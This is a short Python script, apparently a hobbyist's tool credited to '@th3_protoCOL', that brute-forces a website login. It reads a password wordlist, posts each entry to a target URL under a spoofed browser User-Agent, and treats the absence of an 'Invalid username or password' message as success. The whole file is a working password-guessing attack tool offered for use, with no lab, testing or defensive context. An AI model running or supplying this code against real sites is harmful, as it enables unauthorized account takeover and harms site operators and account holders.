import requests, argparse, sys

parser = argparse.ArgumentParser(description="Simple python login brute force by @th3_protoCOL")
parser.add_argument('url', help="Website to target")
parser.add_argument('wordlist', help="Wordlist of passwords to attempt")
args = parser.parse_args()	
#TODO:Handle Args better

headers = {'User-Agent':'Mozilla/5.0'}

def main():
    print("[*] Wordlist: "+args.wordlist)
    print("[*] URL: "+ args.url)
    with open(args.wordlist, 'r') as f:
        words = f.read().split()
        print("[*] Starting attack...")
        for word in words:
            send(word)

def send(password):
    payload = {'password':password}			#TODO: Improve this
    r = requests.post(args.url,headers=headers,data=payload)
    if "Invalid username or password" in r.text:	#TODO: Improve this
        print("[-] Incorrect: "+password)
    else:
        print("[+] Correct: "+password)			#TODO: Add option to keep going
        sys.exit(0)

main()

